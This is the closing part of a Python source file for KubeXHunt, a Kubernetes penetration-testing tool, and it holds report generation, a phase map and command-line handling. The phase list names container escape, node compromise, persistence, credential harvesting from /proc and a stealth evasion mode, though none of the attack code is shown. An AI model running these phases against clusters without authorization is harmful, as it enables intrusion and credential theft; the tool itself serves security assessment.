  :root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#c9d1d9;--accent:#58a6ff}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',monospace;padding:20px}}
  h1{{color:#f44;font-size:2em;margin-bottom:5px}}
  h2{{color:var(--accent);margin:20px 0 10px}}
  .meta{{color:#8b949e;font-size:.9em;margin-bottom:20px}}
  .summary{{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}}
  .card{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:16px;min-width:120px;text-align:center}}
  .card .count{{font-size:2.5em;font-weight:700}}
  .card .label{{font-size:.85em;color:#8b949e}}
  .finding{{background:var(--card);border:1px solid var(--border);border-radius:6px;margin:8px 0;padding:12px 16px}}
  .finding-header{{display:flex;align-items:center;gap:10px;margin-bottom:6px}}
  .severity{{color:#fff;font-size:.75em;padding:2px 8px;border-radius:4px;font-weight:700}}
  .detail{{font-size:.85em;color:#8b949e;margin:4px 0;white-space:pre-wrap}}
  .remediation{{font-size:.83em;color:#3fb950;margin-top:6px}}
  details{{margin:12px 0}}
  summary.phase-header{{background:var(--card);padding:10px 14px;border-radius:6px;cursor:pointer;color:var(--accent);font-weight:700;list-style:none;border:1px solid var(--border)}}
  .attack-path{{background:var(--card);border:1px solid #f44;border-radius:8px;padding:16px;margin:12px 0}}
  .node{{background:#21262d;border-radius:6px;padding:8px 14px;display:inline-block;margin:4px 0;color:#f0f6fc}}
  .arrow{{color:#8b949e;margin:4px 14px;font-size:.9em}}
  .via{{color:#fa0;font-style:italic}}
  svg.gauge{{display:block;margin:10px auto}}
</style>
</head>
<body>
<h1>🔴 KubeXHunt Security Assessment Report</h1>
<div class="meta">
  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} |
  Cluster: {CTX.get('api','')} |
  Namespace: {CTX.get('namespace','')} |
  SA: {CTX.get('sa_name','unknown')} |
  Cloud: {CTX.get('cloud','Unknown')} |
  K8s: {CTX.get('k8s_version','')}
</div>

<div class="summary">
  <div class="card"><div class="count" style="color:#f44">{counts['CRITICAL']}</div><div class="label">CRITICAL</div></div>
  <div class="card"><div class="count" style="color:#fa0">{counts['HIGH']}</div><div class="label">HIGH</div></div>
  <div class="card"><div class="count" style="color:#ffd700">{counts['MEDIUM']}</div><div class="label">MEDIUM</div></div>
  <div class="card"><div class="count" style="color:#58a6ff">{counts['LOW']}</div><div class="label">LOW</div></div>
  <div class="card"><div class="count" style="color:#3fb950">{counts['PASS']}</div><div class="label">PASS</div></div>
  <div class="card"><div class="count" style="color:#fff">{total_issues}</div><div class="label">TOTAL ISSUES</div></div>
</div>

{path_html}

<h2>📋 All Findings</h2>
{findings_html}

<div style="margin-top:40px;color:#8b949e;font-size:.8em;text-align:center">
  KubeXHunt v1.2.0 | Author: Mayank Choubey | For authorized security assessments only
</div>
</body>
</html>"""

    with open(filepath,"w") as f:
        f.write(html)

def _save_txt(filepath):
    with open(filepath,"w") as f:
        f.write(f"KubeXHunt v1.2.0 Security Assessment Report\n")
        f.write(f"Generated: {datetime.now().isoformat()}\n")
        f.write(f"Cluster: {CTX.get('api','')} | NS: {CTX.get('namespace','')} | "
                f"SA: {CTX.get('sa_name','')} | Cloud: {CTX.get('cloud','')}\n\n")
        for fnd in FINDINGS:
            f.write(f"[{fnd['severity']}] {fnd['check']}\n")
            if fnd.get("detail"):   f.write(f"  Detail: {fnd['detail'][:300]}\n")
            if fnd.get("remediation"): f.write(f"  Fix: {fnd['remediation'][:200]}\n")
            f.write("\n")

# ══════════════════════════════════════════════════════════════════
# FINAL REPORT
# ══════════════════════════════════════════════════════════════════
def print_final_report(phases_run, elapsed):
    print(f"\n{c(C.CYAN,'═'*70)}")
    print(c(C.BOLD+C.WHITE,"  KUBEXHUNT v1.2.0 — FINAL ASSESSMENT REPORT"))
    print(f"{c(C.CYAN,'═'*70)}\n")

    counts = {s: 0 for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO","PASS"]}
    for fnd in FINDINGS:
        counts[fnd["severity"]] = counts.get(fnd["severity"],0) + 1

    print(f"  {c(C.GRAY,'Cluster  :')} {CTX.get('api','?')}")
    print(f"  {c(C.GRAY,'Namespace:')} {CTX.get('namespace','?')}")
    print(f"  {c(C.GRAY,'SA       :')} {CTX.get('sa_name','unknown')}")
    print(f"  {c(C.GRAY,'Cloud    :')} {CTX.get('cloud','Unknown')}")
    print(f"  {c(C.GRAY,'K8s Ver  :')} {CTX.get('k8s_version','unknown')}")
    print(f"  {c(C.GRAY,'Duration :')} {elapsed:.1f}s")
    print(f"  {c(C.GRAY,'Phases   :')} {', '.join(str(p) for p in phases_run)}\n")

    print(f"  {c(C.BOLD,'Findings Breakdown:')}")
    print(f"  {'─'*44}")
    print(f"  🔴 CRITICAL : {c(C.RED,    str(counts['CRITICAL']).rjust(4))}")
    print(f"  🟠 HIGH     : {c(C.ORANGE, str(counts['HIGH']).rjust(4))}")
    print(f"  🟡 MEDIUM   : {c(C.YELLOW, str(counts['MEDIUM']).rjust(4))}")
    print(f"  🔵 LOW      : {c(C.BLUE,   str(counts['LOW']).rjust(4))}")
    print(f"  ✅ PASS     : {c(C.GREEN,  str(counts['PASS']).rjust(4))}")
    print(f"  {'─'*44}")
    total = counts["CRITICAL"]+counts["HIGH"]+counts["MEDIUM"]+counts["LOW"]
    print(f"  {'Total Issues':12}: {c(C.BOLD+C.WHITE, str(total).rjust(4))}\n")

    if counts["CRITICAL"] > 0:
        risk = c(C.RED+C.BOLD,"🔴 CRITICAL RISK — Immediate action required")
    elif counts["HIGH"] > 2:
        risk = c(C.ORANGE+C.BOLD,"🟠 HIGH RISK — Significant vulnerabilities present")
    elif counts["HIGH"] > 0 or counts["MEDIUM"] > 3:
        risk = c(C.YELLOW+C.BOLD,"🟡 MEDIUM RISK — Important gaps identified")
    else:
        risk = c(C.GREEN+C.BOLD,"🟢 LOW RISK — Good security posture")
    print(f"  Overall Risk: {risk}\n")

    # Attack paths summary
    if ATTACK_GRAPH:
        print_attack_paths()

    # Critical & High summary
    crit_high = [f for f in FINDINGS if f["severity"] in ("CRITICAL","HIGH")]
    if crit_high:
        print(f"  {c(C.BOLD,'Critical & High Findings:')}")
        print(f"  {'─'*66}")
        for fnd in crit_high[:15]:
            col  = C.RED if fnd["severity"] == "CRITICAL" else C.ORANGE
            icon = "🔴" if fnd["severity"] == "CRITICAL" else "🟠"
            print(f"  {icon} {c(col, fnd['severity'].ljust(8))} {c(C.BOLD, fnd['check'][:60])}")
            if fnd.get("remediation"):
                print(f"       {c(C.GREEN,'⚑')} {c(C.DIM+C.GREEN, fnd['remediation'][:80])}")
        if len(crit_high) > 15:
            print(f"  {c(C.GRAY, f'  ... and {len(crit_high)-15} more')}")

    print(f"\n{c(C.CYAN,'═'*70)}\n")

# ══════════════════════════════════════════════════════════════════
# PHASE MAP
# ══════════════════════════════════════════════════════════════════
PHASE_MAP = {
    0:  ("Setup & kubectl",              phase_setup),
    1:  ("Pod & Container Recon",        phase_pod_recon),
    2:  ("Cloud Metadata & IAM",         phase_cloud_metadata),
    3:  ("RBAC & K8s API",              phase_rbac),
    4:  ("Network & Lateral Move",       lambda: phase_network(fast=False)),
    5:  ("Container Escape",             phase_escape),
    6:  ("Node Compromise",              phase_node),
    7:  ("Cluster Escalation",           phase_privesc),
    8:  ("Persistence",                  phase_persistence),
    9:  ("Supply Chain & Admission",     phase_supply_chain),
    10: ("EKS-Specific",                 phase_eks),
    11: ("GKE-Specific",                 phase_gke),
    12: ("Runtime Security",             phase_runtime),
    13: ("Secrets & Sensitive Data",     phase_secrets),
    14: ("DoS & Resource Limits",        phase_dos),
    15: ("Cluster Intel & CVEs",         phase_cluster_intel),
    16: ("Kubelet Exploitation",         phase_kubelet),
    17: ("etcd Exposure",                phase_etcd),
    18: ("Helm & App Secrets",           phase_helm),
    19: ("/proc Credential Harvesting",  phase_proc_harvest),
    20: ("Azure AKS",                    phase_azure),
    21: ("OpenShift / OKD",             phase_openshift),
    22: ("Advanced Red Team",            phase_advanced),
    23: ("Attack Chain Simulation",      phase_attack_chains),
    24: ("Stealth & Evasion Analysis",   phase_stealth_analysis),
    25: ("Network Plugin & Misc",        phase_misc),
    26: ("Diff & Reporting",             lambda: phase_reporting(CTX.get("diff_file"))),
}

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════
def main():
    global NO_COLOR

    parser = argparse.ArgumentParser(
        description="KubeXHunt v1.2.0 — Kubernetes Security Assessment Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 kubexhunt.py                              # Full scan (all phases)
  python3 kubexhunt.py --phase 3 7 15              # Specific phases
  python3 kubexhunt.py --fast                      # Skip slow DNS/port scan
  python3 kubexhunt.py --stealth 2 --no-mutate     # Silent read-only mode
  python3 kubexhunt.py --output report.json        # JSON report
  python3 kubexhunt.py --output report.html        # HTML report
  python3 kubexhunt.py --output report.sarif       # SARIF report (CI/CD)
  python3 kubexhunt.py --diff previous.json        # Diff vs last scan
  python3 kubexhunt.py --proxy http://127.0.0.1:8080  # Route via Burp
  python3 kubexhunt.py --phase-list                # List all phases and exit
        """)
    parser.add_argument("--phase", nargs="+", type=int, help="Run specific phase(s) (0-26)")
    parser.add_argument("--fast",       action="store_true", help="Skip slow port scan / DNS brute")
    parser.add_argument("--stealth",    type=int, default=0, choices=[0,1,2],
                        help="Stealth level: 0=off 1=jitter+UA 2=full evasion")
    parser.add_argument("--no-mutate",  action="store_true", help="Skip all mutating API calls")
    parser.add_argument("--output",     metavar="FILE", help="Save report (.json .html .sarif .txt)")
    parser.add_argument("--diff",       metavar="PREV.json", help="Diff vs previous JSON report")
    parser.add_argument("--no-color",   action="store_true", help="Disable color output")
    parser.add_argument("--proxy",      metavar="URL", help="HTTP proxy for API calls (e.g. Burp)")
    parser.add_argument("--kubectl-only", action="store_true", help="Only install kubectl then exit")
    parser.add_argument("--phase-list", action="store_true", help="List all phases and exit")
    parser.add_argument("--exclude-phase", nargs="+", type=int, help="Skip specific phase(s)")

    args = parser.parse_args()
    NO_COLOR = args.no_color

    if args.phase_list:
        print("\nKubeXHunt v1.2.0 — Phase Reference\n")
        for num, (name, _) in sorted(PHASE_MAP.items()):
            print(f"  Phase {num:>2}  {name}")
        print()
        sys.exit(0)

    # Store config in CTX
    CTX["stealth"]    = args.stealth
    CTX["no_mutate"]  = args.no_mutate
    CTX["proxy"]      = args.proxy or ""
    CTX["diff_file"]  = args.diff or ""

    banner()
    start = time.time()

    # Phase 0 always runs first
    try:
        phase_setup()
    except Exception as e:
        print(c(C.RED, f"\n  ✗ Phase 0 error: {e}"))

    if args.kubectl_only:
        print(c(C.GREEN,"\n  ✓ Done. Run without --kubectl-only for full assessment."))
        return

    # Determine phase list
    if args.phase:
        phases_to_run = sorted(set(p for p in args.phase if p != 0))
    else:
        phases_to_run = list(range(1, 27))

    # Apply exclusions
    if args.exclude_phase:
        phases_to_run = [p for p in phases_to_run if p not in args.exclude_phase]

    # Fast mode overrides network phase
    if args.fast and 4 in phases_to_run:
        PHASE_MAP[4] = ("Network & Lateral Move (fast)", lambda: phase_network(fast=True))

    for phase_num in phases_to_run:
        if phase_num not in PHASE_MAP:
            print(c(C.YELLOW, f"  ⚠ Unknown phase: {phase_num} — skipping"))
            continue
        try:
            PHASE_MAP[phase_num][1]()
        except KeyboardInterrupt:
            print(c(C.YELLOW, f"\n  ⚠ Phase {phase_num} interrupted"))
            break
        except Exception as e:
            print(c(C.RED, f"\n  ✗ Phase {phase_num} ({PHASE_MAP[phase_num][0]}) error: {e}"))

    elapsed     = time.time() - start
    phases_run  = [0] + phases_to_run
    print_final_report(phases_run, elapsed)

    if args.output:
        save_report(args.output)

    # CI/CD exit code
    if CTX.get("ci_fail"):
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(c(C.YELLOW,"\n\n  ⚠ Assessment interrupted by user"))
        if FINDINGS:
            print_final_report([], 0)
        sys.exit(0)
